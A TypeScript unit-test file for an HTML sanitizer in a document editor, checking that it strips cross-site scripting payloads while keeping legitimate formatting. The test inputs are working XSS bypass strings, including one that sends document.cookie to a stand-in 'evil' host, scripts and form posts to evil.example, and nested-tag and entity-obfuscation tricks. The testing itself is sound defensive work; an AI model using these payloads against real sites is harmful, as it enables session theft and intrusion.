// Unit tests for the document-HTML sanitizer (the XSS trust boundary for the
// Word-editor body). Run:
//   node --experimental-strip-types --experimental-loader ./scripts/ts-ext-hook.mjs scripts/sanitize-html.test.ts
import { sanitizeDocHtml, isUnsafeDocHtml } from "../src/lib/sanitize-html.ts";

let pass = 0, fail = 0;
const ok = (name: string, cond: boolean, info = "") => {
  if (cond) pass++;
  else { fail++; console.error("✗ " + name + (info ? ` — ${info}` : "")); }
};
const has = (h: string, s: string) => h.includes(s);
const gone = (h: string, s: string) => !h.toLowerCase().includes(s.toLowerCase());

// ── strips active content ─────────────────────────────────────────────────────
ok("removes <script> blocks and their content",
  gone(sanitizeDocHtml(`<p>hi</p><script>fetch('//evil?'+document.cookie)</script>`), "fetch"));
ok("removes onerror handler on img",
  gone(sanitizeDocHtml(`<img src=x onerror="alert(document.cookie)">`), "onerror"));
ok("removes onload on svg",
  gone(sanitizeDocHtml(`<svg onload=alert(1)></svg>`), "onload"));
ok("removes onclick with single quotes",
  gone(sanitizeDocHtml(`<div onclick='steal()'>x</div>`), "onclick"));
ok("removes onmouseover with unquoted value",
  gone(sanitizeDocHtml(`<a onmouseover=go()>x</a>`), "onmouseover"));
ok("neutralizes javascript: href",
  gone(sanitizeDocHtml(`<a href="javascript:alert(1)">x</a>`), "javascript:"));
ok("neutralizes vbscript: src",
  gone(sanitizeDocHtml(`<img src="vbscript:msgbox">`), "vbscript:"));
ok("defangs data:text/html",
  gone(sanitizeDocHtml(`<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`), "text/html"));
ok("removes <iframe>",
  gone(sanitizeDocHtml(`<iframe src="//evil"></iframe>`), "<iframe"));
ok("removes <object> and <embed>",
  gone(sanitizeDocHtml(`<object data="x"></object><embed src="y">`), "<object") &&
  gone(sanitizeDocHtml(`<embed src="y">`), "<embed"));

// ── handler-separator bypasses: `/` and closing-quote are attribute separators ───
ok("removes onload after a slash separator (<svg/onload=…>)",
  gone(sanitizeDocHtml(`<svg/onload=alert(1)>`), "onload"));
ok("removes onerror abutting a closing quote (<img src=\"x\"onerror=…>)",
  gone(sanitizeDocHtml(`<img src="x"onerror=alert(1)>`), "onerror"));
ok("removes onerror after a slash before other attrs (<img/onerror=… src=x>)",
  gone(sanitizeDocHtml(`<img/onerror=alert(1) src=x>`), "onerror"));
ok("removes chained handlers (<img/onload=a/onerror=b>)",
  gone(sanitizeDocHtml(`<img/onload=a()/onerror=b()>`), "onload") &&
  gone(sanitizeDocHtml(`<img/onload=a()/onerror=b()>`), "onerror"));
ok("slash-separated handler does not eat a real attribute's quote",
  has(sanitizeDocHtml(`<img src="/brand/x.png"onerror=alert(1)>`), 'src="/brand/x.png"'));

// ── URL scheme bypasses via HTML-entity / control-char obfuscation ──────────────
ok("neutralizes entity-encoded javascript: (&#106;avascript:)",
  has(sanitizeDocHtml(`<a href="&#106;avascript:alert(1)">x</a>`), 'href="#"'));
ok("neutralizes tab-obfuscated javascript: (jav&#9;ascript:)",
  has(sanitizeDocHtml(`<a href="jav&#9;ascript:alert(1)">x</a>`), 'href="#"'));
ok("neutralizes hex-entity javascript: (&#x6a;avascript:)",
  has(sanitizeDocHtml(`<a href="&#x6a;avascript:alert(1)">x</a>`), 'href="#"'));
ok("drops a data:text/html src entirely (not an image)",
  gone(sanitizeDocHtml(`<img src="data:text/html,<script>bad</script>">`), "text/html"));
ok("blanks a data: href (navigable → never allowed)",
  has(sanitizeDocHtml(`<a href="data:image/svg+xml,<svg onload=1>">x</a>`), 'href="#"'));

// ── the URL allow-list keeps every legitimate value untouched ───────────────────
ok("keeps relative/anchor href", has(sanitizeDocHtml(`<a href="#top">t</a>`), 'href="#top"') &&
  has(sanitizeDocHtml(`<a href="/apply">a</a>`), 'href="/apply"'));
ok("keeps tel: links", has(sanitizeDocHtml(`<a href="tel:+35921234">c</a>`), "tel:+35921234"));

// ── keeps legitimate formatting ───────────────────────────────────────────────
const rich = `<h2 class="sec">Раздел</h2><p style="color:#9e2b2b">текст <strong>bold</strong></p>` +
  `<table class="ptable"><tr><td>a</td><td>b</td></tr></table><ul><li>x</li></ul>`;
ok("keeps headings/paragraphs/strong", has(sanitizeDocHtml(rich), "<strong>bold</strong>"));
ok("keeps style attribute (formatting)", has(sanitizeDocHtml(rich), 'style="color:#9e2b2b"'));
ok("keeps tables", has(sanitizeDocHtml(rich), '<table class="ptable">'));
ok("keeps Cyrillic content intact", has(sanitizeDocHtml(rich), "Раздел"));
ok("keeps http links", has(sanitizeDocHtml(`<a href="https://ptsbg.eu">site</a>`), 'href="https://ptsbg.eu"'));
ok("keeps mailto links", has(sanitizeDocHtml(`<a href="mailto:x@y.bg">m</a>`), "mailto:x@y.bg"));
ok("keeps data:image base64 (inline images)",
  has(sanitizeDocHtml(`<img src="data:image/png;base64,iVBORw0KGgo=">`), "data:image/png;base64,iVBORw0KGgo="));
// part 1.12: a picture only from the portal's own places — its storage, ptsbg.eu
process.env.NEXT_PUBLIC_SUPABASE_URL = "https://x.supabase.co";
ok("keeps the portal's uploaded photos (its own storage)",
  has(sanitizeDocHtml(`<img src="https://x.supabase.co/storage/v1/object/public/skin-assets/a.png" style="width:60mm">`), "https://x.supabase.co/storage/v1/object/public/skin-assets/a.png"));
ok("drops a picture from anywhere else (a viewer's browser is never sent there)",
  !has(sanitizeDocHtml(`<img src="https://tracker.example.net/p.gif">`), "tracker.example.net"));
delete process.env.NEXT_PUBLIC_SUPABASE_URL;
ok("preserves HTML comment markers (BODY/COVER)",
  has(sanitizeDocHtml(`<!--PTS:CV-->\n<p>x</p>`), "<!--PTS:CV-->"));

// ── editor formulas (MathML) + tick marks must round-trip untouched ─────────────
const formula = `<span class="we-f" contenteditable="false" data-f="z = (x_i − x_pt) / σ_pt"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi>z</mi><mo>=</mo><mfrac><mrow><mi>x</mi></mrow><mrow><mi>σ</mi></mrow></mfrac></mrow></math></span>`;
ok("keeps inserted formulas (MathML) verbatim", sanitizeDocHtml(formula) === formula);
const ticks = `<p><span class="ff-opt"><span class="ff-box on">✓</span><span>Опция</span></span> <span class="ff-opt"><span class="ff-rb on">●</span><span>Да</span></span></p>`;
ok("keeps toggled tickboxes/radios verbatim", sanitizeDocHtml(ticks) === ticks);

// ── the property that matters: sanitize is idempotent + flags unsafe input ──────
const dirty = `<p>ok</p><img src=x onerror=alert(1)><script>bad()</script>`;
const once = sanitizeDocHtml(dirty);
ok("idempotent (second pass is a no-op)", sanitizeDocHtml(once) === once);
ok("clean input is unchanged", sanitizeDocHtml(rich) === rich, "sanitizer must not rewrite safe HTML");
ok("isUnsafeDocHtml true for handler", isUnsafeDocHtml(dirty));
ok("isUnsafeDocHtml false for clean", !isUnsafeDocHtml(rich));
ok("empty/nullish safe", sanitizeDocHtml("") === "" && sanitizeDocHtml(null) === "" && sanitizeDocHtml(undefined) === "");

// ── the security sweep (SI-1): nested and unclosed tags, an iframe's inline document ────────
const live = (h: string) => /<\s*(script|iframe|object|embed|frame|base|meta|form)\b/i.test(h) || /\bsrcdoc\s*=/i.test(h) || /\bon[a-z]+\s*=/i.test(h.replace(/&[a-z]+;/g, ""));
for (const payload of [
  `<scr<script>ipt>alert(1)</scr<script>ipt>`,
  `<ifr<script>ame srcdoc="&lt;script&gt;parent.x=1&lt;/script&gt;"></iframe>`,
  `<ifr<scr<scr<script>ipt>ipt>ame style="display:none" srcdoc="&lt;script&gt;x()&lt;/script&gt;">`,
  `<p>ok</p><iframe srcdoc="&lt;script&gt;x()&lt;/script&gt;"`,
  `<p>ok</p><scr<script>ipt src=//evil.example/x.js></scr<script>ipt>`,
  `<sc<style>x</style>ript>alert(1)</script>`,
  `<im<script>g src=x onerror=alert(1)>`,
  `<img src=x on<script>error=alert(1)>`,
  `<a href="javas<script>cript:alert(1)">x</a>`,
  `<div srcdoc="&lt;script&gt;x()&lt;/script&gt;">x</div>`,
  `<button formaction="javascript:alert(1)">x</button>`,
  `<object data="x"`,
]) {
  const once = sanitizeDocHtml(payload);
  ok(`nothing live survives: ${payload.slice(0, 50)}`, !live(once) && !/javascript:/i.test(once), once);
  ok(`…and sanitizing again changes nothing (a fixed point): ${payload.slice(0, 40)}`, sanitizeDocHtml(once) === once, sanitizeDocHtml(once));
  // what the print shell does: wrap and close — an unclosed tag must not be closed into life
  ok(`…nor once wrapped in the print shell: ${payload.slice(0, 40)}`, !live(`<div>${once}</div>`), once);
}
ok("a document's own formatting is kept as it was",
  sanitizeDocHtml(`<!-- BODY --><h1 class="t">Заглавие</h1><p style="text-align:center">Текст <b>удебелен</b> <a href="https://ptsbg.eu">връзка</a></p><table><tr><td colspan="2">x</td></tr></table>`)
    === `<!-- BODY --><h1 class="t">Заглавие</h1><p style="text-align:center">Текст <b>удебелен</b> <a href="https://ptsbg.eu">връзка</a></p><table><tr><td colspan="2">x</td></tr></table>`);
// round 2 (R2S-1, R2S-2, R2S-8, R2S-10): the portal's markers inside a tag, a script's scheme in any
// attribute, SVG's animation, pictures from anywhere, and a linear pass
for (const payload of [
  `<scr<!--PTS:BS-->ipt>alert(1)</scr<!--PTS:BS-->ipt>`,
  `<me<!--PTS:BE-->ta http-equiv=refresh content="0;url=https://evil.example">`,
  `<fo<!--PTS:BS-->rm action=https://evil.example><input name=p></fo<!--PTS:BS-->rm>`,
  `<img src=x on<!--PTS:BS-->error=alert(1)>`,
  `<a href="java<!--PTS:BS-->script:alert(1)">x</a>`,
  `<a x=href="a href=&#106;avascript:alert(1)//">c</a>`,
  `<svg><a><animate attributeName=href values=&#106;avascript:alert(1) /><text>x</text></a></svg>`,
  `<svg><a><set attributeName=href to=javascript:alert(1) /><text>x</text></a></svg>`,
]) {
  const once = sanitizeDocHtml(payload);
  const shell = (once.split("<!--PTS:BS-->").join("").split("<!--PTS:BE-->").join(""));
  ok(`round 2 — nothing live, even once the shell's markers are removed: ${payload.slice(0, 44)}`, !live(once) && !live(shell) && !/javascript:|<meta|<form|<animate|<set\b/i.test(shell), shell);
}
ok("round 2 — a cover's mark between tags is kept", sanitizeDocHtml(`<!--PTS:CV-->\n<p>x</p>`) === `<!--PTS:CV-->\n<p>x</p>`);
for (const [name, html] of [["srcset", `<img srcset="https://evil.example/x.png 1x">`], ["background", `<td background="https://evil.example/x.png">x</td>`], ["poster", `<video poster="https://evil.example/p.png"></video>`], ["a style's url()", `<p style="background:url(https://evil.example/s.png)">x</p>`], ["a backslash", `<img src="\\evil.example/x.png">`], ["a portal page", `<img src="/lab/doc/S/report">`], ["a relative page", `<img src="report">`]] as const) {
  ok(`round 2 — no picture from ${name}`, !/evil\.example|\/lab\/doc|src="report"/.test(sanitizeDocHtml(html)), sanitizeDocHtml(html));
}
ok("round 2 — the portal's own pictures kept", sanitizeDocHtml(`<img src="/brand/logo.png"><img src="data:image/png;base64,AAAA">`) === `<img src="/brand/logo.png"><img src="data:image/png;base64,AAAA">`);
{
  const t0 = Date.now(); sanitizeDocHtml("<style>".repeat(120_000)); sanitizeDocHtml("<script ".repeat(60_000));
  ok("round 2 — a pathological body is handled in linear time", Date.now() - t0 < 2000, `${Date.now() - t0} ms`);
}

ok("text that merely mentions a form or a script is not touched", sanitizeDocHtml(`<p>The script of the form: 5 &lt; 6</p>`) === `<p>The script of the form: 5 &lt; 6</p>`);

console.log(`\nsanitize-html.test: ${pass} passed, ${fail} failed`);
if (fail) process.exitCode = 1;
